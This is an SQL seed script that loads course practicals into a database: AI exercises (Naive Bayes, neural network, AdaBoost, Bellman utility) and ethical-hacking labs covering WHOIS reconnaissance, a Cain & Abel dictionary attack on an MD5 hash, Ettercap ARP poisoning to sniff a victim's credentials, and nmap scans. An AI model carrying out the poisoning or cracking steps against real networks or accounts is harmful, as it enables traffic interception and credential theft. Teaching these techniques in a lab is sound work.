    $json$["Import rwp_examples (12 examples x1..x12) from RWP.py and set total_exp = 12.","Define tot(attribute, value) to count occurrences of an attribute-value pair across all 12 examples.","Define getProbab(attribute, attribval, value) to compute P(Attribute = attribval | ans = value).","Compute prior probabilities for every attribute and class label (PAnsYes, PAnsNo).","Apply Bayes theorem P(ans | Attribute) = (P(Attribute | ans) * P(ans)) / P(Attribute) * 100 for Alternate Restaurant, Estimated Wait Time, Patrons, and Restaurant Type."]$json$::jsonb,
    $json$["Save RWP.py containing rwp_examples in the same directory.","Run P6.py to print posterior Naive-Bayes probabilities for the Restaurant Waiting Problem."]$json$::jsonb,
    $json$["Requires RWP.py (Page 3 of AI PDF) in the same folder.","# Common File: RWP.py (Page 3 of final_AI__3f2816a9.pdf)\nrwp_examples = dict(\n    x1=dict(Alt='Y', Bar='N', Fri='N', Hun='Y', Pat='S', Price='$$$', Rain='N', Res='Y', Type='F', Est='0-10', ans='Y'),\n    x2=dict(Alt='Y', Bar='N', Fri='N', Hun='Y', Pat='F', Price='$', Rain='N', Res='N', Type='T', Est='30-60', ans='N'),\n    x3=dict(Alt='N', Bar='Y', Fri='N', Hun='N', Pat='S', Price='$', Rain='N', Res='N', Type='B', Est='0-10', ans='Y'),\n    x4=dict(Alt='Y', Bar='N', Fri='Y', Hun='Y', Pat='F', Price='$', Rain='Y', Res='N', Type='T', Est='10-30', ans='Y'),\n    x5=dict(Alt='Y', Bar='N', Fri='Y', Hun='N', Pat='F', Price='$$$', Rain='N', Res='Y', Type='F', Est='>60', ans='N'),\n    x6=dict(Alt='N', Bar='Y', Fri='N', Hun='Y', Pat='S', Price='$$', Rain='Y', Res='Y', Type='I', Est='0-10', ans='Y'),\n    x7=dict(Alt='N', Bar='Y', Fri='N', Hun='N', Pat='N', Price='$', Rain='Y', Res='N', Type='B', Est='0-10', ans='N'),\n    x8=dict(Alt='N', Bar='N', Fri='N', Hun='Y', Pat='S', Price='$$', Rain='Y', Res='Y', Type='T', Est='0-10', ans='Y'),\n    x9=dict(Alt='N', Bar='Y', Fri='Y', Hun='N', Pat='F', Price='$', Rain='Y', Res='N', Type='B', Est='>60', ans='N'),\n    x10=dict(Alt='Y', Bar='Y', Fri='Y', Hun='Y', Pat='F', Price='$$$', Rain='N', Res='Y', Type='I', Est='10-30', ans='N'),\n    x11=dict(Alt='N', Bar='N', Fri='N', Hun='N', Pat='N', Price='$', Rain='N', Res='N', Type='T', Est='0-10', ans='N'),\n    x12=dict(Alt='Y', Bar='Y', Fri='Y', Hun='Y', Pat='F', Price='$', Rain='N', Res='N', Type='B', Est='0-10', ans='Y')\n)"]$json$::jsonb,
    ARRAY[$item$naive bayes$item$, $item$naive-bayes$item$, $item$rwp$item$, $item$restaurant waiting problem$item$, $item$probability$item$, $item$bayes theorem$item$, $item$rwp.py$item$]::text[],
    ARRAY[$item$AI Practical 6$item$, $item$Naive Bayes Restaurant Waiting Problem$item$, $item$RWP Naive Bayes$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 3, 20, 21, 22]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 7: Feed Forward Back Propagation Neural Network Learning Algorithm (source_key: artificial-intelligence-practical-7)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000007',
    $skey$artificial-intelligence-practical-7$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    7,
    $title$Feed Forward Back Propagation Neural Network Learning Algorithm$title$,
    $q$Implement feed forward back propagation neural network learning algorithm.$q$,
    $code$import numpy as np

class NeuralNetwork():
    def __init__(self):
        # seeding for random number generation
        np.random.seed(1)
        # converting weights to a 3 by 1 matrix
        self.synaptic_weights = 2 * np.random.random((3, 1)) - 1

    # x is output variable
    def sigmoid(self, x):
        # applying the sigmoid function
        return 1 / (1 + np.exp(-x))

    def sigmoid_derivative(self, x):
        # computing derivative to the sigmoid function
        return x * (1 - x)

    def train(self, training_inputs, training_outputs, training_iterations):
        # training the model to make accurate predictions while adjusting
        for iteration in range(training_iterations):
            # siphon the training data via the neuron
            output = self.think(training_inputs)
            error = training_outputs - output
            # performing weight adjustments
            adjustments = np.dot(training_inputs.T, error * self.sigmoid_derivative(output))
            self.synaptic_weights += adjustments

    def think(self, inputs):
        # passing the inputs via the neuron to get output
        # converting values to floats
        inputs = inputs.astype(float)
        output = self.sigmoid(np.dot(inputs, self.synaptic_weights))
        return output

if __name__ == "__main__":
    # initializing the neuron class
    neural_network = NeuralNetwork()
    print("Beginning randomly generated weights: ")
    print(neural_network.synaptic_weights)

    # training data consisting of 4 examples--3 inputs & 1 output
    training_inputs = np.array([[0, 0, 1], [1, 1, 1], [1, 0, 1], [0, 1, 1]])
    training_outputs = np.array([[0, 1, 1, 0]]).T

    # training taking place
    neural_network.train(training_inputs, training_outputs, 15000)

    print("Ending weights after training: ")
    print(neural_network.synaptic_weights)

    user_input_one = str(input("User Input One: "))
    user_input_two = str(input("User Input Two: "))
    user_input_three = str(input("User Input Three: "))

    print("Considering new situation: ", user_input_one, user_input_two, user_input_three)
    print("New output data: ")
    print(neural_network.think(np.array([user_input_one, user_input_two, user_input_three])))$code$,
    $orig$import numpy as np
class NeuralNetwork():
    def _init_(self):
        #seeding for random number generation
        np.random.seed()
        #converting weights to a 3 by 1 matrix
        self.synaptic_weights=2*np.random.random((3,1))-1
    #x is output variable
    def sigmoid(self, x):
        #applying the sigmoid function
        return 1/(1+np.exp(-x))
    def sigmoid_derivative(self,x):
        #computing derivative to the sigmoid function
        return x*(1-x)
    def train(self,training_inputs,training_outputs,training_iterations):
        #training the model to make accurate predictions while adjusting
        for iteration in range(training_iterations):
            #siphon the training data via the neuron
            output=self.think(training_inputs)
            error=training_outputs-output
            #performing weight adjustments
            adjustments=np.dot(training_inputs.T,error*self.sigmoid_derivative(output))
            self.synaptic_weights+=adjustments
    def think(self,inputs):
        #passing the inputs via the neuron to get output
        #converting values to floats
        inputs=inputs.astype(float)
        output=self.sigmoid(np.dot(inputs,self.synaptic_weights))
        return output
if _name_ == "_main_":
    #initializing the neuron class
    neural_network=NeuralNetwork()
    print("Beginning randomly generated weights: ")
    print(neural_network.synaptic_weights)
    #training data consisting of 4 examples--3 inputs & 1 output
    training_inputs=np.array([[0,0,1],[1,1,1],[1,0,1],[0,1,1]])
    training_outputs=np.array([[0,1,1,0]]).T
    #training taking place
    neural_network.train(training_inputs,training_outputs,15000)
    print("Ending weights after training: ")
    print(neural_network.synaptic_weights)
    user_input_one=str(input("User Input One: "))
    user_input_two=str(input("User Input Two: "))
    user_input_three=str(input("User Input Three: "))
    print("Considering new situation: ",user_input_one,user_input_two,user_input_three)
    print("New output data: ")
    print(neural_network.think(np.array([user_input_one,user_input_two,user_input_three])))$orig$,
    $lang$Python$lang$,
    $out$Beginning randomly generated weights: 
[[ 0.67813245]
 [ 0.90926853]
 [-0.4150907 ]]
Ending weights after training: 
[[10.08758208]
 [-0.206867  ]
 [-4.83771668]]
User Input One: 2
User Input Two: 4
User Input Three: 6
Considering new situation:  2 4 6
New output data: 
[6.26049311e-05]$out$,
    $json$["Define NeuralNetwork class with 3x1 synaptic_weights initialized randomly in [-1, 1].","Implement sigmoid activation function 1 / (1 + exp(-x)) and its derivative x * (1 - x).","In train(), perform forward pass output = think(training_inputs) for 15,000 iterations.","Compute error = training_outputs - output and weight adjustment via dot(training_inputs.T, error * sigmoid_derivative(output)).","Prompt user for three inputs and compute forward prediction via neural_network.think()."]$json$::jsonb,
    $json$["Install numpy: pip install numpy","Run the Python script and enter 2, 4, 6 when prompted for User Input One, Two, and Three."]$json$::jsonb,
    $json$["Conservative correction applied: fixed single underscores _init_ and _name_ == \"_main_\" to double underscores __init__ and __name__ == \"__main__\", and fixed wrapped integer 15 000 -> 15000."]$json$::jsonb,
    ARRAY[$item$neural network$item$, $item$feed forward$item$, $item$back propagation$item$, $item$backpropagation$item$, $item$sigmoid$item$, $item$synaptic_weights$item$, $item$numpy$item$]::text[],
    ARRAY[$item$AI Practical 7$item$, $item$Feed Forward Backpropagation Neural Network$item$, $item$ANN Backpropagation Python$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 23, 24]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 8: AdaBoost (Adaptive Boosting) Learning Algorithm (source_key: artificial-intelligence-practical-8)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000008',
    $skey$artificial-intelligence-practical-8$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    8,
    $title$AdaBoost (Adaptive Boosting) Learning Algorithm$title$,
    $q$Implement AdaBoost (Adaptive Boosting) learning algorithm$q$,
    $code$import pandas
from sklearn import model_selection
from sklearn.ensemble import AdaBoostClassifier

url = "https://raw.githubusercontent.com/jbrownlee/Datasets/master/pima-indians-diabetes.data.csv"
names = ['preg', 'plas', 'pres', 'skin', 'test', 'mass', 'pedi', 'age', 'class']
dataframe = pandas.read_csv(url, names=names)
array = dataframe.values
X = array[:, 0:8]
Y = array[:, 8]
seed = 7
num_trees = 30

model = AdaBoostClassifier(n_estimators=num_trees, random_state=seed)
results = model_selection.cross_val_score(model, X, Y)
print(results.mean())$code$,
    $orig$import pandas
fromsklearn import model_selection
from sklearn.ensemble import AdaBoostClassifier
url = "https://raw.githubusercontent.com/jbrownlee/Datasets/master/pima-indians-diabetes.data.csv" names = ['preg', 'plas', 'pres', 'skin', 'test', 'mass', 'pedi', 'age', 'class']
dataframe = pandas.read_csv(url, names=names) array = dataframe.values
X = array[:,0:8]
Y = array[:,8]
seed = 7
num_trees = 30
model = AdaBoostClassifier(n_estimators=num_trees, random_state=seed)
results = model_selection.cross_val_score(model, X, Y)
print(results.mean())$orig$,
    $lang$Python$lang$,
    $out$0.7617774382480265$out$,
    $json$["Load the Pima Indians Diabetes dataset from the raw GitHub CSV URL using pandas.read_csv().","Extract feature matrix X (first 8 columns) and target vector Y (column 8: class).","Set random seed = 7 and number of weak learners num_trees = 30.","Initialize AdaBoostClassifier(n_estimators=num_trees, random_state=seed).","Evaluate model using model_selection.cross_val_score(model, X, Y) and print the mean cross-validation accuracy."]$json$::jsonb,
    $json$["Install pandas and scikit-learn: pip install pandas scikit-learn","Run AIp6.py (Practical 8) with internet access to load the CSV and output the mean accuracy."]$json$::jsonb,
    $json$["Conservative correction applied: separated inline statements onto distinct lines and fixed fromsklearn -> from sklearn."]$json$::jsonb,
    ARRAY[$item$adaboost$item$, $item$adaptive boosting$item$, $item$ensemble$item$, $item$adaboostclassifier$item$, $item$pima indians diabetes$item$, $item$cross_val_score$item$]::text[],
    ARRAY[$item$AI Practical 8$item$, $item$AdaBoost Classifier Python$item$, $item$Adaptive Boosting Algorithm$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 25]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Artificial Intelligence] Practical 9: Reinforcement Learning Algorithm (Bellman State Utility) (source_key: artificial-intelligence-practical-9)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'a1000000-0000-4000-8000-000000000009',
    $skey$artificial-intelligence-practical-9$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$artificial-intelligence$s$),
    9,
    $title$Reinforcement Learning Algorithm (Bellman State Utility)$title$,
    $q$Implement Reinforcement Learning algorithm.$q$,
    $code$import numpy as np

def return_state_utility(v, T, u, reward, gamma):
    action_array = np.zeros(4)
    for action in range(0, 4):
        action_array[action] = np.sum(np.multiply(u, np.dot(v, T[:, :, action])))
    return reward + gamma * np.max(action_array)

def main():
    v = np.array([[0.0, 0.0, 0.0, 0.0,
                   0.0, 0.0, 0.0, 0.0,
                   1.0, 0.0, 0.0, 0.0]])
    T = np.load("T.npy")
    u = np.array([[0.812, 0.868, 0.918, 1.0, 0.762, 0.0, 0.660, -1.0,
                   0.705, 0.655, 0.611, 0.388]])
    reward = -0.4
    gamma = 1.0
    utility_11 = return_state_utility(v, T, u, reward, gamma)
    print("Utility of state (1,1): " + str(utility_11))

main()$code$,
    $orig$import numpy as np
def return_state_utility(v, T, u, reward, gamma):
action_array = np.zeros(4)
for action in range(0, 4):
action_array[action] = np.sum(np.multiply(u, np.dot(v, T[:,:,action]))) return reward + gamma * np.max(action_array)
def main():
v = np.array([[0.0, 0.0, 0.0, 0.0,
0.0, 0.0, 0.0, 0.0,
1.0, 0.0, 0.0, 0.0]])
T= np.load("T.npy")
u = np.array([[0.812, 0.868, 0.918, 1.0, 0.762, 0.0, 0.660, -1.0,
0.705, 0.655, 0.611, 0.388]])
reward = -0.4
gamma
1.0
utility_11 = return_state_utility(v, T, u, reward, gamma)
print("Utility of state (1,1): " + str(utility_11))main()$orig$,
    $lang$Python$lang$,
    $out$Utility of state (1,1): 0.3456$out$,
    $json$["Define return_state_utility(v, T, u, reward, gamma) to compute the Bellman equation utility of a state.","For each of the 4 actions (Up, Left, Down, Right), compute expected utility sum(multiply(u, dot(v, T[:, :, action]))).","Return reward + gamma * max(action_array).","In main(), define state vector v (with 1.0 at state index 8 corresponding to (1,1)), load transition matrix T.npy (12x12x4), and define state utility vector u.","Set reward = -0.4 and discount factor gamma = 1.0, then print the calculated utility of state (1,1)."]$json$::jsonb,
    $json$["Save the 12x12x4 transition matrix from pages 26-28 of the AI PDF as T.npy using np.save(\"T.npy\", T).","Run P9.py to calculate and output Utility of state (1,1): 0.3456."]$json$::jsonb,
    $json$["Requirement: T.npy transition matrix file (12x12x4 array printed on pages 26-28 of final_AI__3f2816a9.pdf).","Conservative correction applied: fixed gamma 1.0 -> gamma = 1.0 and restored indentation."]$json$::jsonb,
    ARRAY[$item$reinforcement learning$item$, $item$bellman$item$, $item$return_state_utility$item$, $item$t.npy$item$, $item$utility of state$item$, $item$markov decision process$item$, $item$mdp$item$]::text[],
    ARRAY[$item$AI Practical 9$item$, $item$Reinforcement Learning State Utility$item$, $item$RL Bellman Equation Python$item$]::text[],
    $pdf$final_AI__3f2816a9.pdf$pdf$,
    ARRAY[1, 26, 27, 28]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 1: Google and WHOIS Reconnaissance (source_key: ethical-hacking-practical-1)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000001',
    $skey$ethical-hacking-practical-1$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    1,
    $title$Google and WHOIS Reconnaissance$title$,
    $q$GOOGLE AND WHO – IS RECONNAISSANCE$q$,
    NULL,
    NULL,
    $lang$Reconnaissance / Web Tool$lang$,
    $out$Domain Name Information Lookup for www.youtube.com (Registrar info, DNS records, Ping results, and Traceroute results on who.is).$out$,
    '[]'::jsonb,
    $json$["Step 1: Open the WHO.is website (https://who.is).","Step 2: Enter the website name (e.g., www.youtube.com) in the Domain Name Information Lookup bar and hit the \"Enter\" / Search button.","Step 3: Review the output showing comprehensive domain registration, contact information, DNS records, Ping results, and Traceroute results for www.youtube.com."]$json$::jsonb,
    $json$["Uses https://who.is for passive WHOIS, DNS, Ping, and Traceroute reconnaissance."]$json$::jsonb,
    ARRAY[$item$whois$item$, $item$who.is$item$, $item$google reconnaissance$item$, $item$footprint$item$, $item$domain lookup$item$, $item$youtube.com$item$, $item$reconnaissance$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 1$item$, $item$Google and Whois Reconnaissance$item$, $item$WHOIS Lookup Practical$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 2]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 2: Password Encryption and Cracking with CrypTool and Cain and Abel (source_key: ethical-hacking-practical-2)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000002',
    $skey$ethical-hacking-practical-2$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    2,
    $title$Password Encryption and Cracking with CrypTool and Cain and Abel$title$,
    $q$PASSWORD ENCRYPTION AND CRACKING WITH CRYPTOOL AND CAIN AND ABLE$q$,
    NULL,
    NULL,
    $lang$Security Tools (CrypTool & Cain and Abel)$lang$,
    $out$Part 1 (CrypTool): Plaintext encrypted to hexadecimal via RC4 (24-bit key 00 00 00) and decrypted back to original text.
Part 2 (Cain & Abel): MD5 hash (5F4DCC3B5AA765D61D8...) cracked via Dictionary Attack using Wordlist.txt revealing password "password".$out$,
    '[]'::jsonb,
    $json$["PART 1 — USE CRYPTOOL TO ENCRYPT PASSWORD USING THE RC4 ALGORITHM:","Step 1: Go to Chrome and install CrypTool from http://www.cryptool.org/en/ct1downloads.","Step 2: Open CrypTool.","Step 3: Click on File -> New and type plain text in the editor window.","Step 4: Click on Encrypt/Decrypt -> Symmetric (modern) -> RC4.","Step 5: Select the key length (24 bits, key 00 00 00) and click Encrypt.","Step 6: Observe the RC4 encrypted hexadecimal output.","Step 7: To decrypt, click Encrypt/Decrypt -> Symmetric (modern) -> RC4.","Step 8: Select the same number of bits (24 bits, key 00 00 00) and click Decrypt.","Step 9: Observe the decrypted plaintext message.","PART 2 — USE CAIN AND ABEL TO PERFORM A DICTIONARY ATTACK ON WINDOWS ACCOUNT PASSWORDS:","Step 1: Search for Cain and Abel in Chrome and download it.","Step 2: Open the installer and install Cain & Abel 4.9.56.","Step 3: Download WinPcap 4.1.3 from Chrome.","Step 4: Install WinPcap 4.1.3.","Step 5: Open the Cain and Abel tool.","Step 6: Click on the \"Cracker\" tab and select the Hash Calculator (or MD5 Hashes list).","Step 7: In Hash Calculator, enter a text password (e.g., \"password\") in \"Text to hash\", click Calculate, and copy the MD5 hash value.","Step 8: Add the hash value under Cracker -> MD5 Hashes, right-click the hash entry, and select \"Dictionary Attack\".","Step 9: Right-click in the Dictionary list pane, select \"Add to list\", choose C:\\Program Files (x86)\\Cain\\Wordlists\\Wordlist.txt, and click \"Start\" to crack the password."]$json$::jsonb,
    $json$["Contains two sub-practicals: (1) RC4 encryption/decryption using CrypTool 1.x and (2) MD5 dictionary attack using Cain & Abel + WinPcap 4.1.3."]$json$::jsonb,
    ARRAY[$item$cryptool$item$, $item$cain and abel$item$, $item$cain and able$item$, $item$rc4$item$, $item$md5$item$, $item$dictionary attack$item$, $item$password cracking$item$, $item$password encryption$item$, $item$wincap$item$, $item$winpcap$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 2$item$, $item$Password Encryption and Decryption with CrypTool$item$, $item$Cain and Abel Dictionary Attack$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 3, 4, 5, 6, 7]::integer[],
    $v$verified$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 3: Linux Network Analysis and ARP Poisoning (Ettercap) (source_key: ethical-hacking-practical-3)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000003',
    $skey$ethical-hacking-practical-3$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    3,
    $title$Linux Network Analysis and ARP Poisoning (Ettercap)$title$,
    $q$LINUX NETWORK ANALYSIS AND ARP POISONING$q$,
    $code$# Part 1: Linux Network Analysis Commands
ifconfig
ping 192.168.152.128
netstat
traceroute 192.168.247.136

# Part 2: ARP Poisoning with Ettercap
ifconfig
ettercap-graphical$code$,
    $orig$ifconfig
ping 192.168.152.128
neststat
tracroute 192.168.152.128
ettercap-graphical$orig$,
    $lang$Bash / Kali Linux$lang$,
    $out$Part 1: eth0 IP address (192.168.152.128), ICMP echo replies from ping, active UNIX/TCP sockets from netstat, and hop latency from traceroute.
Part 2: Ettercap graphical interface discovering live hosts (192.168.152.1, 192.168.152.2, 192.168.152.254) and sniffing remote connections via MITM ARP Poisoning.$out$,
    '[]'::jsonb,
    $json$["PART 1 — LINUX NETWORK ANALYSIS:","Step 1: Open the Kali Linux machine and open the Kali Linux terminal.","Step 2: Type command `ifconfig` into the terminal to find the machine IP address (e.g., 192.168.152.128).","Step 3: Use `ping 192.168.152.128` to test network connectivity and analyze packet transmission.","Step 4: Use `netstat` (written as neststat in PDF text) to view active network connections.","Step 5: Use `traceroute 192.168.247.136` (written as tracroute 192.168.152.128 in PDF text) to trace the route packets take to reach a target host.","PART 2 — ARP POISONING:","Step 1: Open the Kali Linux terminal and type `ifconfig` to check the IP address.","Step 2: Type `ettercap-graphical` to start the graphical version of Ettercap and select primary interface `eth0`.","Step 3: Click the \"Hosts\" tab in the menu bar and click \"Scan for hosts\" to scan the network for alive hosts.","Step 4: Click the \"Hosts\" tab and select \"Hosts list\" to view available hosts and the default gateway.","Step 5: Select the victim IP and router gateway IPs and assign them to Target 1 and Target 2.","Step 6: Click on the \"MITM\" menu (earth icon), select \"ARP poisoning...\", check \"Sniff remote connections\", and click OK.","Step 7: Click \"Start\" -> \"Start sniffing\" to enable promiscuous mode and start ARP poisoning.","Step 8: Observe captured traffic and credentials in the Ettercap toolbar/logs when the victim visits websites."]$json$::jsonb,
    $json$["Conservative correction: fixed PDF text typos `neststat` -> `netstat` and `tracroute` -> `traceroute` to match the actual Kali terminal screenshots on pages 8-9."]$json$::jsonb,
    ARRAY[$item$linux network analysis$item$, $item$arp poisoning$item$, $item$ettercap$item$, $item$ettercap-graphical$item$, $item$ifconfig$item$, $item$ping$item$, $item$netstat$item$, $item$traceroute$item$, $item$mitm$item$]::text[],
    ARRAY[$item$Ethical Hacking Practical 3$item$, $item$ARP Poisoning with Ettercap$item$, $item$Kali Linux Network Analysis$item$]::text[],
    $pdf$final_ethical_hacking_607197eb.pdf$pdf$,
    ARRAY[1, 8, 9, 10]::integer[],
    $v$corrected$v$,
    false,
    true
)
ON CONFLICT (source_key) DO UPDATE SET
    subject_id = EXCLUDED.subject_id,
    practical_number = EXCLUDED.practical_number,
    title = EXCLUDED.title,
    original_question = EXCLUDED.original_question,
    corrected_code = EXCLUDED.corrected_code,
    original_code = EXCLUDED.original_code,
    programming_language = EXCLUDED.programming_language,
    expected_output = EXCLUDED.expected_output,
    algorithm_steps = EXCLUDED.algorithm_steps,
    procedure_steps = EXCLUDED.procedure_steps,
    instructions = EXCLUDED.instructions,
    keywords = EXCLUDED.keywords,
    aliases = EXCLUDED.aliases,
    source_pdf = EXCLUDED.source_pdf,
    source_pages = EXCLUDED.source_pages,
    verification_status = EXCLUDED.verification_status,
    review_required = EXCLUDED.review_required,
    is_published = EXCLUDED.is_published,
    updated_at = now();

-- [Ethical Hacking] Practical 4: Port Scanning with Nmap (ACK, SYN, FIN, NULL, and XMAS Scans) (source_key: ethical-hacking-practical-4)
INSERT INTO public.practicals (
    id,
    source_key,
    subject_id,
    practical_number,
    title,
    original_question,
    corrected_code,
    original_code,
    programming_language,
    expected_output,
    algorithm_steps,
    procedure_steps,
    instructions,
    keywords,
    aliases,
    source_pdf,
    source_pages,
    verification_status,
    review_required,
    is_published
) VALUES (
    'b2000000-0000-4000-8000-000000000004',
    $skey$ethical-hacking-practical-4$skey$,
    (SELECT id FROM public.subjects WHERE slug = $s$ethical-hacking$s$),
    4,
    $title$Port Scanning with Nmap (ACK, SYN, FIN, NULL, and XMAS Scans)$title$,
    $q$PORT SCANNING WITH NMAP$q$,
    $code$# 1. ACK Scan to determine if ports are filtered or unfiltered
nmap -sA -T4 scanme.nmap.org

# 2. SYN / Port Scan on specific ports (22, 113, 139)
nmap -p 22,113,139 scanme.nmap.org

# 3. FIN Scan (-sF) sets just the TCP FIN bit
